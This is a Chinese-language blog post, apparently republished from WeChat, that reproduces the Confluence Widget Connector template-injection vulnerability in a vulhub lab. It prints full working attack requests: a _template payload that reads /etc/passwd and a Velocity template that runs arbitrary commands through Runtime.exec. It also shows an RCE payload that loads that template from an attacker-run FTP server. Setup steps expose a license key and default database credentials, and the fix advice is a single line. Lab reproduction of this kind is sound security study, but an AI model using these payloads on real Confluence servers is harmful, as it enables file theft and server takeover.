> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HzHZRjrb9hk2zZ6Cs4fdxg)

![](https://mmbiz.qpic.cn/mmbiz_png/Ar7BeyBAjVLic0ia4vSFIKa3mGPglabHsr3w9saZKOUiaicF3nkIIVicIiaX0kMGSG7qG5iaHNHbAoXbIvLmAxf35xaxg/640?wx_fmt=png)

点击上方蓝字关注我们

0x01 前言
-------

### 1、漏洞简介

Confluence 是一个专业的企业知识管理与协同软件，常用于构建企业 wiki。它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。Confluence Server 与 Confluence Data Center 中的 Widget Connector 存在服务端模板注入漏洞，攻击者构造特定请求可远程遍历服务器任意文件，进而可以包含恶意文件来执行代码。可能造成敏感信息泄露，服务器被控制等严重后果。

### 2、影响范围

6.6.12 之前所有 6.6.x 版本 6.12.3 之前所有 6.12.x 版本 6.13.13 之前所有 6.13.x 版本 6.14.2 之前所有 6.14.x 版本

0x02 配置环境：
----------

最好给服务器虚拟机 4G 以上内存，vulhub 启动 confluence 环境，接下来初始化配置：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKB97licA0FglRZsEk1qp8YdtGe8sYreClBg9H79tgwRVj45v2nKCuG9nA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBEsRoypA3S8oOFjw20ssMlwWLJfibt77GrVDzZASCEFNMJt4s9tpnzOA/640?wx_fmt=png)  

BSBI-NU9A-RRKH-P24K

邮箱注册

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBiaZPI2ibhPaGCxKLZMfUD2kI0QIUl1C5pDoKohhotxCcGt84V5kFPJvA/640?wx_fmt=png)  
  

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKB35MfraFvASW0iaguRYia8CotvhZo5JzzPTBB2FwTzcIJc6mfcN5rmmBw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBwpMiaBmpicK1iaGtdV72WLkSwdnbB7qv15KIiazEUE8bZkFGanl8VOG2Jw/640?wx_fmt=png)

  

然后填写一个集团名和路径 / home/confluence 共享目录配置数据库连接

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBKtX0BlnD2sXA7BC6GRQx2iaNicvNBA7xUYl5Lw7dxyo1z6icyguYRCW0Q/640?wx_fmt=png)

postgres/postgres 数据库用户名密码具体过程可以看文章：https://blog.csdn.net/weixin_43072923/article/details/117083611

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBAbvGcu8C76BN7v7MoGSw4liaLy3mYfl45zpEGeFPPsicq9rrn4uAibxsw/640?wx_fmt=png)

  
  
点 example site 点 manager

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBIP4OdzMjcLbmtNKJ4OL8s55RJUn31acMUmUich4PaKOW4ySwKgoB2Tg/640?wx_fmt=png)

  
输入用户邮箱密码

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBjcgZW0qNpQx7mW6fs9R9ZoNh5hJzDuPdqNE8uZTmEcNKtzuSy4zIfw/640?wx_fmt=png)

  
之后的教程跳过 - 跳过 - test - 继续配置完成

0x03 文件读取
---------

### 1、漏洞触发位置：

插入更多内容（+ 号）-- 其他宏 -- 小工具连接器

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBkBMKwwjicrI3JlpwH8eavHCGV9lkvsBzrDNTBXZ44f81RubMXyeLy7Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBQaYTNhSyZeM0AwS4PJopbKX9NSQDsboGVnUOJoIVjwwshp3HWKjxZA/640?wx_fmt=png)

### 2、抓包，修改（没有账号直接抓登陆包修改也可以）

```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 192.168.72.129:8090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.72.129:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=E1D021B04024032C964FB9E6A11D340B
Connection: close
Content-Type: application/json; charset=utf-8
Content-Length: 168

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBLAia0ibEWvs7PkJrApSZ5mFOqTUGUkwEKN2ib2joPQsreQ7adC9boZZrA/640?wx_fmt=png)

  

### 3、将_template 参数修改为 file 伪协议读取任意文件

```
{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"file:///etc/passwd"}}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKB4gX74bwcNuvV3djyQ8Pia0gSDwRQUhXiaF7O43b4kud1294AgSQgvyNQ/640?wx_fmt=png)

0x04 远程代码执行
-----------

此处文件包含可以使用如 file、https、ftp 等协议，如果文件是一个 Velocity 模板，我们可以通过模板注入（SSTI）执行任意命令

### 1、写一个 velocity 模板文件：

参考：https://blog.csdn.net/weixin_43072923/article/details/117083611

```
#set ($exp="exp")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
```

### 2、开一个 ftp 服务

这里图省事直接在服务器 ubuntu 上开了 ftp 服务，实际可以在 kali 或者另找一个 ubuntu 即可

```
pip install pyftpdlib
python3 -m pyftpdlib -p 21
```

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBvJxSO5RLqzOoIicia3BD8LhNibMibDO6npgRsXSDTtSzCXMo0BVYdkt3YQ/640?wx_fmt=png)

payload:

```
{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"ftp://192.168.72.129:21/test.vm","command":"id"}}}
```

### 3、发包，命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgydH0ZLzGJV0WqGRT3axgKBaib4JUQgAnsxwKvRAbPsJMkwCQB1KqM2tjReEGx9ZPkDiaLZl0OZcdyA/640?wx_fmt=png)

0x05 修复建议
---------

官方已修复该漏洞，请到官网下载无漏洞版本：https://www.atlassian.com/

公众号

![](https://mmbiz.qpic.cn/mmbiz_gif/6aVaON9Kibf7jNIAOgqwdCv2J77riaDsoMDSpLqoaUiao8aD9r3FwP0gFU2Psuqv6SgVAPhib8hibvO8CaEM8wu1Arw/640?wx_fmt=gif)